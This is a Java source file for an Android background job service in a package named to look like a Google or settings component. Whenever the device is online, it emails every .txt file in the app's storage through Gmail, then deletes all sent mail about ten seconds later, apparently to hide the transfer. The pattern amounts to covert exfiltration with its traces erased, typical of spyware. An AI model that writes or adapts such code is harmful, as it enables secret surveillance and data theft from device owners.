package com.setting.dl.google.gmailapi;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;

import com.setting.dl.google.gmailapi.mail.gmail.Mail;

public final class MailJobs extends JobService {
	
	private static final int MAIL_JOBS = 5;
	
	
	@Override
	public boolean onStartJob(JobParameters params) {
		
		if (u.isDeviceOnline(getApplicationContext())){
			
			String[] files = fileList();
			
			for (String file : files) {
				
				if (file.endsWith(".txt")) {
					
					Mail.send(this, file);
					u.run(() -> Mail.deleteAllSent(this), 10000);
				}
			}
		}
		
		return true;
	}
	
	@Override
	public boolean onStopJob(JobParameters params) {
		return false;
	}
	
	
	public static void wake(Context context) {
		
		ComponentName componentName = new ComponentName(context.getApplicationContext(), MailJobs.class);
		
		JobInfo.Builder builder = new JobInfo.Builder(MAIL_JOBS, componentName);
		builder.setMinimumLatency(10000);
		builder.setOverrideDeadline(60000);
		
		JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
		
		if(jobScheduler == null) return;
		
		jobScheduler.schedule(builder.build());
		
		
	}
}
